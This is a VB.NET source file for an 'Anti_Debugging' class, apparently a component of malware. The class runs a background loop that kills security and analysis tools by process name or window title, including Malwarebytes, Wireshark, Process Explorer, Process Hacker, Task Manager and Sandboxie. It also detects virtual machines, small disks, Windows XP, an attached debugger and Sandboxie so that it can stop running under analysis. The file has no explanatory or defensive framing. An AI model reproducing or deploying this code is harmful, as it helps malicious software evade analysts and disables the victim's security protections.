Imports System.Management
Imports System.IO
Imports System.Runtime.InteropServices

Namespace Antis
    Public Class Anti_Debugging
        Public Function Start()
            Dim thread As New Threading.Thread(AddressOf Bypass)
            thread.IsBackground = True
            thread.Start(True)

            If (IsSmallDisk()) OrElse (IsXP()) OrElse (DetectManufacturer()) OrElse (DetectDebugger()) OrElse (DetectSandboxie()) Then
                Return False
            Else
                Return True
            End If
        End Function
        Public Function Bypass(x As Boolean)
            Dim ProcessName() As String = {"procexp", "SbieCtrl", "SpyTheSpy", "SpeedGear", "wireshark", "mbam", "apateDNS", "IPBlocker", "cports", "ProcessHacker", "KeyScrambler", "Tcpview", "smsniff", "exeinfoPE", "regshot", "RogueKiller", "NetSnifferCs", "taskmgr", "Reflector", "capsa", "NetworkMiner", "AdvancedProcessController", "ProcessLassoLauncher", "ProcessLasso", "SystemExplorer"}
            Dim Titles() As String = {"ApateDNS", "Malwarebytes Anti-Malware", "Malwarebytes Anti-Malware", "TCPEye", "SmartSniff", "Active Ports", "ProcessEye", "MKN TaskExplorer", "CurrPorts", "System Explorer", "DiamondCS Port Explorer", "VirusTotal", "Metascan Online", "Speed Gear", "The Wireshark Network Analyzer", "Sandboxie Control", "ApateDNS", ".NET Reflector"}
            Try
                Do While x = True
                    For Each PrName As String In ProcessName
                        Dim ProcessList() As Process = System.Diagnostics.Process.GetProcessesByName(PrName)
                        For Each proc As Process In ProcessList
                            proc.Kill()
                        Next
                    Next

                    For Each Title As String In Titles
                        For Each proc As Process In Process.GetProcesses
                            If proc.MainWindowTitle.Contains(Title) Then
                                proc.Kill()
                            End If
                        Next
                    Next
                Loop
            Catch ex As Exception
                Return ex.Message
            End Try
            Return ""
        End Function
        Private Shared Function IsSmallDisk() As Boolean
            Try
                Dim GB_60 As Long = 61000000000
                If New DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= GB_60 Then Return True
            Catch
            End Try

            Return False
        End Function

        Private Shared Function IsXP() As Boolean
            Try

                If New Microsoft.VisualBasic.Devices.ComputerInfo().OSFullName.ToLower().Contains("xp") Then
                    Return True
                End If

            Catch
            End Try

            Return False
        End Function

        Private Shared Function DetectManufacturer() As Boolean
            Try

                Using searcher = New ManagementObjectSearcher("Select * from Win32_ComputerSystem")

                    Using items = searcher.[Get]()

                        For Each item In items
                            Dim manufacturer As String = item("Manufacturer").ToString().ToLower()

                            If (manufacturer = "microsoft corporation" AndAlso item("Model").ToString().ToUpperInvariant().Contains("VIRTUAL")) OrElse manufacturer.Contains("vmware") OrElse item("Model").ToString() = "VirtualBox" Then
                                Return True
                            End If
                        Next
                    End Using
                End Using

            Catch
            End Try

            Return False
        End Function

        Private Shared Function DetectDebugger() As Boolean
            Dim isDebuggerPresent As Boolean = False

            Try
                NativeMethods.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, isDebuggerPresent)
                Return isDebuggerPresent
            Catch
                Return isDebuggerPresent
            End Try
        End Function

        Private Shared Function DetectSandboxie() As Boolean
            Try

                If NativeMethods.GetModuleHandle("SbieDll.dll").ToInt32() <> 0 Then
                    Return True
                Else
                    Return False
                End If

            Catch
                Return False
            End Try
        End Function
    End Class
    Public Module NativeMethods
        <DllImport("kernel32.dll")>
        Public Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
        End Function

        <DllImport("kernel32.dll", SetLastError:=True, ExactSpelling:=True)>
        Public Function CheckRemoteDebuggerPresent(ByVal hProcess As IntPtr, ByRef isDebuggerPresent As Boolean) As Boolean
        End Function
    End Module
End Namespace